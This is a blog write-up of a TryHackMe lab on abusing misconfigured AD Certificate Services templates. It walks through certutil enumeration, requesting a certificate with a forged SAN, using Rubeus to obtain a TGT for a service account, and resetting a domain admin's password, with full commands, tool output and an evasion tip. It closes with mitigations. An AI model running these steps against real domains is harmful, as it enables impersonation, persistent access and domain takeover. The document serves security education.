---
title: AD Certificate Templates
date: 2023-05-03 00:00:00 -500
categories: [Red Team Operator, Compromising AD]
tags: [TryHackMe]
---

-----------

# Intro 

- This room explores the ***AD Certificate Services*** (AD CS) and the misconfigurations seen with certificate templates.

- Research done and released as a whitepaper by SpecterOps showed that it was possible to exploit misconfigured certificate templates for **privilege escalation** and **lateral movement**. Based on the severity of the misconfiguration, it could possibly allow any low-privileged user on the AD domain to escalate their privilege to that of an Enterprise Domain Admin with just a few clicks!

- This room provides a walkthrough on how to enumerate misconfigured templates and create a privilege escalation exploit using them. The room is based heavily on the research done by SpecterOps, but only covers a single exploit path for certificates. For more information on AD CS exploitation, please read their `[whitepaper](https://posts.specterops.io/certified-pre-owned-d95910965cd2)`.

- Start the VM to begin the room. You will be using RDP to connect, so make sure to either use the THM VPN or AttackBox and then RDP with an RDP client such as Remmina. The following low privileged credentials are provided below. Please allow around 5 minutes for the machine to fully boot.

**Username:** `thm`  
**Password:** `Password1@`
**Domain:** `lunar.eruca.com`


<u>Logged in the VM</u>:

![](/assets/img/Pasted image 20230216172125.png)



-------
# A brief look at Certificate Templates

- Windows AD is not just for `identity and access management` but provides a significant amount of services to help you run and manage your organization.
- A lot of these services are **less commonly known or used**, meaning they are often `overlooked` when security hardening is performed.
- One of these less commonly used services is `Active Directory Certificate Services (AD CS)`


- When talking about certificates, we usually only think about the most common ones, such as those used to upgrade website traffic to HTTPS.
- But these are usually only used for apps that the organization exposes to the internet.
- What about all those apps running on the `internal network only`?
- Do we now have to give them internet access to allow them to request a certificate from a trusted `Certificate Authority (CA)`? Well, not really. Cue, AD CS.

		- If AD CS is internal and can be done offline, doesn't it make it susceptible to tampering?

- `AD CS` is **Microsoft's Public Key Infrastructure** (PKI) implementation.
- Since AD provides a level of trust in an organization, it can be used as a CA to `prove` and `delegate trust`.
- AD CS is used for several things such as:

		1. Encrypting file systems
		2. Creating and Verifying Digital signatures
		3. User Authentication

- which makes it promising for attackers.

- What makes it an even more dangerous attack vector, is that certificates can survive **credential rotation**.

		- "Credential Rotation" : Even if a compromised account's password is reset, that would do nothing to invalidate the maliciously generated certificate, providing persistent credential theft for up to 10 years!
		- Note that certificates are NOT like cookies that once you logged out a session, the cookie will be invalidated.

<u>Diagram that shows what the flow for certificate requests and generation looks like (taken from SpecterOps whitepaper)</u>:

![](/assets/img/Pasted image 20230214210300.png)


- Since AD CS, is such a privileged function, it normally runs on selected **Domain Controllers**.
- Meaning, normal users can't really interact with the service directly.
- On the other side of the coin, organizations tend to be too large to have an administrator create and distribute each certificate manually.
- This is where certificate templates come in.
- Administrators of AD CS can create several templates that can allow any user with the relevant permission to request a certificate themselves.
- These templates have parameters that say which user can request the certificate and what is required.
- What `SpecterOps` has found, was that specific combinations of these parameters can be incredibly toxic and be abused for privilege escalation and persistence.

<u>Some Terminology</u>:

	-   PKI - Public Key Infrastructure is a system that manages certificates and public key encryption  
	-   AD CS - Active Directory Certificate Services is Microsoft's PKI implementation which usually runs on domain controllers
	-   CA - Certificate Authority is a PKI that issues certificates  
	-   Certificate Template - a collection of settings and policies that defines how and when a certificate may be issued by a CA
	-   CSR - Certificate Signing Request is a message sent to a CA to request a signed certificate
	-   EKU - Extended/Enhanced Key Usage are object identifiers that define how a generated certificate may be used

-----

# Certificate Template Enumeration

- The first step in this path is to enumerate all certificate templates to identify vulnerable ones and understand what is required to exploit them.
- Luckily, Windows has some awesome `built-in tools` that can be used to **enumerate all certificate templates and their associated policies**.
- The most common approach is to use `certutil`.

##### Step 1: Enumerating all certificate templates and storing them in a file using `certutil`:
- If we have access to a `domain-joined` computer and are authenticated to the domain, we can execute the following command in a *cmd* window to enumerate all templates and store them in a file:

```powershell
> certutil -v -template > cert_templates.txt
```

<u>Possible Output</u>:

![](/assets/img/Pasted image 20230214211428.png)

- The command will provide a bunch of output that may be difficult to read, but we are looking for some key indicators that will tell us that one of the templates is vulnerable.

		- Example of indicators?

- In the output, each template is denoted by `Template[X]` where `X` is the number.
- This can be used if you want to split the output from a single template.


- The ***specific toxic parameter*** set that we are looking for is one that has the following properties:

		- A template where we have the relevant permissions to request the certificate or where we have an account with those permissions.
		- A template that allows client authentication, meaning we can use it for Kerberos authentication.
		- A template that allows us to alter the Subject Alternative Name (SAN).

<u>Parameter 1: Relevant Permissions</u>

- We need to have the ***permissions to generate a certificate request*** in order for this exploit to work.
- We are essentially looking for a template where our user has either the:

		- Allow Enroll
		- Allow Full Control

- You will probably never find a certificate where you have the *Allow Full Control* permission.
- However, if you do congrats.
- You can misconfigure the template yourself to make it vulnerable.
- Let's focus on `Allow Enroll`.


##### `Allow Enroll` permission
- It is not as simple as just `grepping` through the output for the keywords.
- **Allow Enroll** and your AD account, since certificate template permissions are in most cases assigned to AD groups, not directly to AD users.

		- Certificate Template Permissions -> AD Groups

- So you will have to ***grep*** for `Allow Enroll` keywords and review the output to see if any of the returned groups match groups that your user belongs to.

##### Finding your own groups
- If you need to find your own groups:

```powershell
> net user <username> /domain
```

<u>Output</u>:

![](/assets/img/Pasted image 20230216173533.png)

		- Look through this text and check which certificate template passes all three of the toxic parameters below.
		- Also notice that the user 'thm' belongs to the "Domain Users".
		- In this case, you have to find an "Allow Enroll/Allow Full Control" that is applied on the "Domain Users".

- These are two groups that will be fairly common for certificates:

		- "Domain Users" : This means in most cases that any authenticated users can request the certificate
		- "Domain Computers" : This means that the machine account of a domain-joined host can request the certificate. If we have admin rights over any machine, we can request the certificate on behalf of the machine account.

- However, it is usually wise to ***review all certificate permissions***, as it might point you in the direction of an account that will be in your reach to compromise.


<u>Parameter 2: Client Authentication</u>

- Once we've shortened the list to certificate templates that we are allowed to request, the next step is to ensure that the certificate has the ***Client Authentication*** `EKU`.

		- EKU : "Extended Key Usage"

- This `EKU` means that the certificate can be used for `Kerberos Authentication`.
- There are other ways to exploit certificates, but for this room, this EKU will be the primary focus.


- Therefore, for now, we are only interested in certificates that allow **Client Authentication**, meaning the certificate will be granted, given that we are the authenticated user on the machine requesting the certificate.

		- Authenticated User <-> User's machine request the certificate

- To find these, we need to review the EKU properties of the template and ensure that the words ***Client Authentication*** is provided.
- Other templates that do not match this, for now is **discarded**.


<u>Parameter 3: Client Specifies Subject Alternative Name (SAN)</u>

- Last but definitely not least, we need to **verify that the template allows us , the `certificate client`, to specify the Subject Alternative Name(SAN)**.
- The `SAN` is usually something like the **URL of the website** that we are looking to encrypt. (e.g., `tryhackme.com`)
- However, if we have the ability to control the `SAN`, we can leverage the certificate to actually generate a kerberos ticket for any AD account of our choosing!

		- SAN -> Kerberos Ticket for any AD account

- To find these templates, we ***grep*** for the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` property flag that should be set to `1`.
- This indicates that we can specify the `SAN` ourselves.

		- CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT : Allows us to specify the Subject Alternative Name (URL)

- If we find a template where **all three of these conditions are met**, then we are in business and are a few clicks away from `Full Enterprise Admin` rights.
- The fact that we want a **certificate** that does not go through an approval process to `limit human intervention`, but need the fill list of these parameters which aren't covered in here but in `SpecterOps` whitepaper.

### THM Questions:

![](/assets/img/Pasted image 20230216175845.png)

- For the last question, you may want to browse through the created `.txt` file named `cert-template.txt` after executing the command:

```powershell
PS C:\> certutil -v -template > cert_templates.txt
```

<u>Answer</u>:

![](/assets/img/Pasted image 20230216180006.png)

<u>Proof</u>:

![](/assets/img/Pasted image 20230216180036.png)

![](/assets/img/Pasted image 20230216180202.png)

![](/assets/img/Pasted image 20230216180250.png)

	- Basically, in the enumeration part we can figure out what templates are exploitable.


-------
# Generating a malicious certificate

### Goal: Generate the certificate request
- Now that we identified a certificate template that we can exploit, it is time to **generate the certificate request**.

- You could do this step from the command line of you wanted to, but why make your life difficult when Microsoft just allows you to do hacking through the click of some buttons.

##### Step 1: To request a certificate, we will use the `MMC` (Microsoft Management Console)

![](/assets/img/Pasted image 20230216180534.png)

##### Step 2: Click `File -> Add/Remove Snap-in`
![](/assets/img/Pasted image 20230216180558.png)


##### Step 3: Add the `Certificates` snap-in:

![](/assets/img/Pasted image 20230216180630.png)

![](/assets/img/Pasted image 20230216180738.png)


##### Step 4: Although it will add the snap-in directly if you had `administration privileged`, you would see the next prompt:

![](/assets/img/Pasted image 20230216180914.png)

	- In case you don't have admin privileges???

- This prompt allows you to **impersonate service accounts** or the machine account.
- But you can only perform these options if you have admin privileges on the host, which we currently don't have.
- You can now close the snap-in manager and return to the main console screen.


##### Step 5: Expand the `Certificates` option > Right-click on `Personal` > Select `All Tasks` > Click on `Request New Certificate`

![](/assets/img/Pasted image 20230216181140.png)


##### Step 6: After clicking `Request New Certificate`, click `Next` TWICE to reach this page:

![](/assets/img/Pasted image 20230216181324.png)


- As you can see from the screen, we need to complete the information for our certificate before we can enroll it.


##### Step 7: Click the "`More information is required to enroll this certificate`" link to start the process and you will see this:

![](/assets/img/Pasted image 20230216181616.png)

- On this screen, we need to be very specific about the information that we provide.
- In order to ensure that the certificate can be exploited for a `Kerberos Ticket` of a privileged user, we require the `User Principal Name` of the user we wish to impersonate.
- This can be found using the **AD-RSAT** tools or something like the `PowerView` scripts.


- For this example, we will impersonate one of the `DA` users in this domain.
- Let's target the `svc.gitlab` account since it is a ***service account*** , meaning `Kerberos Authentication` is likely expected from this account.
- The **UPN** of this account is `svc.gitlab@lunar.eruca.com`.
- Using this information we can complete the certificate properties.

		- UPN : User Principal Name


##### Step 8: Change the `Subject Name` type to `Common Name` and provide the name we want for this certificate.
- Then, we alter the `Alternative Name` type to `User Principal Name` and provide the UPN of the account we want to impersonate.
- The values should look like this:

![](/assets/img/Pasted image 20230216182816.png)


##### Step 9: Adding these properties to our Certificate:

![](/assets/img/Pasted image 20230216182924.png)

##### Step 10: When we click okay, we will now see that we are allowed to `enroll this certificate`:

![](/assets/img/Pasted image 20230216183314.png)

![](/assets/img/Pasted image 20230216183344.png)


##### Step 11: Complete the enrollment of the certificate. Once enrolled, you will be able to view the certificate under your personal certificates:

![](/assets/img/Pasted image 20230216183505.png)

- If we review the details of the certificate, you will see that the `SAN` now specifies the **UPN** we want to impersonate, definitely not the `SAN` of our web server!

![](/assets/img/Pasted image 20230216183714.png)

- Congratulations, you have just generated a certificate that will provide you with **persistent authentication** to the domain for the next two years.

##### Step 12: Export the certificate to get it ready for use.

- `Right click on the Certificate > Select "All Tasks" > "Export"`

![](/assets/img/Pasted image 20230216183905.png)


##### Step 13: Follow the prompts but make sure to export the `private key` as well

![](/assets/img/Pasted image 20230216184021.png)

![](/assets/img/Pasted image 20230216184046.png)

	- The certificate should be in .pfx format.

##### Step 14: Configure a password for the certificate to ensure the private key is exported:

![](/assets/img/Pasted image 20230216184214.png)

##### Last step: Select a filename for this newly created certificate:

![](/assets/img/Pasted image 20230216184541.png)

![](/assets/img/Pasted image 20230216184555.png)

<u>Output</u>:

![](/assets/img/Pasted image 20230216184624.png)


### THM Questions:

![](/assets/img/Pasted image 20230216184904.png)

-----
# User Impersonation through a Certificate


- Now, we can finally `impersonate a user`. Two steps to perform this:

		1. Use the certificate to request a Kerberos Ticket Granting Ticket (TGT)
		2. Load the Kerberos TGT into your hacking platform of choice.

- For the first step, we will be using `Rubeus`.
- An already compiled version is available in the `C:\THMTools\` directory.
- Open a command prompt window and navigate to this directory.

##### Step 1: Request the TGT using `Rubeus`

- We will be using the following command to request the `TGT`:

```powershell
PS C:\> Rubeus.exe asktgt /user:svc.gitlab /enctype:aes256 /certificate: /password: /outfile:TGT to> /domain:lunar.eruca.com /dc:
```

	Breakdown:
	- "/user" : this specifies the user that we will impersonate and has to match the UPN(User Principal Name) for the certificate we generated.
	- "/enctype" : this specifies the encryption type for the ticket. Setting this is important for evasion, since the default encryption algorithm is weak, which would result in an overpass-the-hash alert.
	- "/certificate" : path to the certificate we have generated.
	- "/password" : the password for our certificate file.
	- "/outfile" : the file where our TGT will be output to.
	- "/domain" : the FQDN (Fully Qualified Domain Name) of the domain we are currently attacking.
	- "/dc" : the IP of the Domain Controller where we are requesting the TGT from. Usually it is best to select a DC that has a CA(Certificate Authority) service running.

<u>Before</u>:

![](/assets/img/Pasted image 20230216190535.png)

	- Don't forget to move 'vulncert' inside THMTools.

- Once we execute the command, we should receive our TGT:

```powershell
PS C:\THMTools> .\Rubeus.exe asktgt /user:svc.gitlab /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:svc.gitlab.kirbi /domain:lunar.eruca.com /dc:10.10.69.219
          ______        _
         (_____ \      | |
          _____) )_   _| |__  _____ _   _  ___
         |  __  /| | | |  _ \| ___ | | | |/___)
         | |  \ \| |_| | |_) ) ____| |_| |___ |
         |_|   |_|____/|____/|_____)____/(___/
       
         v2.0.0
       
       [*] Action: Ask TGT
       
       [*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=vulncert
       [*] Building AS-REQ (w/ PKINIT preauth) for: 'lunar.eruca.com\svc.gitlab'
       [+] TGT request successful!
       [*] base64(ticket.kirbi):
       
             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
       
         ServiceName              :  krbtgt/lunar.eruca.com
         ServiceRealm             :  LUNAR.ERUCA.COM
         UserName                 :  svc.gitlab
         UserRealm                :  LUNAR.ERUCA.COM
         StartTime                :  2/6/2022 5:54:46 PM
         EndTime                  :  2/7/2022 3:54:46 AM
         RenewTill                :  2/13/2022 5:54:46 PM
         Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
         KeyType                  :  aes256_cts_hmac_sha1
         Base64(key)              :  Qr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVU=
         ASREP (key)              :  BF2483247FA4CB89DA0417DFEC7FC57C79170BAB55497E0C45F19D976FD617ED
```

	- Example of the attack.

- We now need to use this `TGT` to gain access.
- This can be done using your favorite hacking framework like `Metasploit, Cobalt Strike, or Covenant`.
- However, for the purpose of this walkthrough, we will be using `Rubeus` again.

<u>In the VM</u>:

![](/assets/img/Pasted image 20230216192002.png)


#### Goal: We will use the ticket to ***alter the password of one of the domain administrators***.
- This will allow us to use the **DA's** credentials to log into the `Domain Controller` as administrator to recover the final flag.


##### Open the `AD Users and Computers` application and explore the domain structure, looking for the `DA`s:

![](/assets/img/Pasted image 20230216191656.png)


##### Select one of the DAs to target and use the following command to `alter their password`:

```powershell
PS C:\> .\Rubeus.exe changepw /ticket:<path to ticket file> /new:<new password for user> /dc:LUNDC.lunar.eruca.com /targetuser:lunar.eruca.com\<username of targeted DA>
```

<u>What's in the directory</u>:

![](/assets/img/Pasted image 20230216192330.png)

```powershell
PS C:\> .\Rubeus.exe changepw /ticket:C:\THMTools /new:coolPlanet /dc:LUNDC.lunar.eruca.com /targetuser:lunar.eruca.com\da-cyoung
```

	- "/new" : new password for the user to be changed into.


- Once the command executes, it should alter the password for the associated DA account:
<u>Example</u>:

```
C:\THMTools> .\Rubeus.exe changepw /ticket:svc.gitlab.kirbi /new:Tryhackme! /dc:LUNDC.lunar.eruca.com /targetuser:lunar.eruca.com\da-cyoung

______        _           
(_____ \     | |            
_____) )_   _| |__  _____ _   _  ___           
|  __  /| | | |  _ \| ___ | | | |/___)           
| |  \ \| |_| | |_) ) ____| |_| |___ |           
|_|   |_|____/|____/|_____)____/(___/                    

v2.0.0                  
[*] Action: Reset User Password (AoratoPw)                  
[*] Using domain controller: LUNDC.lunar.eruca.com (10.10.69.219)         
[*] Resetting password for target user: lunar.eruca.com\da-nread         
[*] New password value: Tryhackme!         
[*] Building AP-REQ for the MS Kpassword request        
[*] Building Authenticator with encryption key type: aes256_cts_hmac_sha1         
[*] base64(session subkey): UP+L2OgmJ281TkkXYNKR0ahLJni1fIk/XMBFwwNTP7Q=         
[*] Building the KRV-PRIV structure         
[+] Password change success!
```

<u>In the VM</u>:

![](/assets/img/Pasted image 20230216193555.png)

	- Be mindful of how the syntax are and always check the feedback.

- You can now authenticate as this user to the `Domain Controller` and recover the final flag.
- Well done! You have now fully compromised DA!
- As an added bonus, let's look at the `runas` command, which we can use to authenticate as another user in the command prompt.
- We can use the following command in `cmd` to authenticate as the now compromised DA user:

```powershell
PS C:\> runas /user:lunar.eruca.com\<username of DA> cmd.exe
```


- You will be prompted to provide the password for the associated account.
- If correct, `runas` will spawn a command prompt window for you as the specified user, which you can now use for administrative duties.

<u>CMD.exe</u>:
![](/assets/img/Pasted image 20230216193721.png)

	- At this point, we succesfully escalated our privilege!

### Getting the Flag from the newly spawned `cmd.exe`:

![](/assets/img/Pasted image 20230216193808.png)



---
# Mitigation and Fixes
So how can you actually defend against these Certificate Template attacks?

There isn't really an easy answer, but there are some good defense techniques:

-   Review all the certificate templates in your organisation for poisonous parameter combinations. You can use [PSPKIAudit](https://github.com/GhostPack/PSPKIAudit) to assist with this.
-   In cases where poisonous parameter combinations cannot be avoided, make sure that there are stopgaps such as having to require Admin Approval before the certificate will be issued.
-   Update your playbooks. Most organisations' playbooks will include something along the lines of resetting the credentials for a compromised account. As pointed out here, that's not really going to remedy the persistent access. Therefore, reviewing certificates that were issued would be required and the malicious certificate will have to be revoked.


------
# Conclusion

That's a wrap!

In this lab, we showed a possible method to exploit misconfigured AD certificate templates. As mentioned previously, there are several different potential toxic parameter combinations that you can look to exploit. Have a read through the SpecterOps whitepaper if you are interested in learning more. Since the lab contains a full Domain Controller and you now have DA access, you can look to configure your own certificate templates to play around with. Have fun!





